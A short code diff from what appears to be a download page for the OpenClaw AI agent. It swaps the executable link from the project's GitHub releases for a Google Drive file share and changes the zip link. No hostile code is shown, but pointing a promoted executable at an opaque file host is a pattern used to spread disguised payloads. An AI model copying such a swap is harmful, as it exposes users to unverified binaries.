@@ -32,8 +32,8 @@ const TITLE =
 const DESC =
   "Download OpenClaw free: the open-source autonomous AI agent that researches the web, writes code, runs terminal commands, debugs itself, and delivers complete software projects. 100% local, $0 fees.";
 
-const EXE_URL = "https://github.com/digiformation/openclaw/releases";
-const ZIP_URL = "https://github.com/digiformation/openclaw/archive/refs/heads/main.zip";
+const EXE_URL = "https://drive.google.com/file/d/1bvTjsKITtbskMexWrjZbYmUeS2gmTpuS/view?usp=sharing";
+const ZIP_URL = openclawZip.url;
 const REPO_URL = "https://github.com/digiformation/openclaw";
 const WHATSAPP = "https://wa.me/923164467464";
 const COMPANY_WEBSITE = "https://www.digiformation.co.uk/";
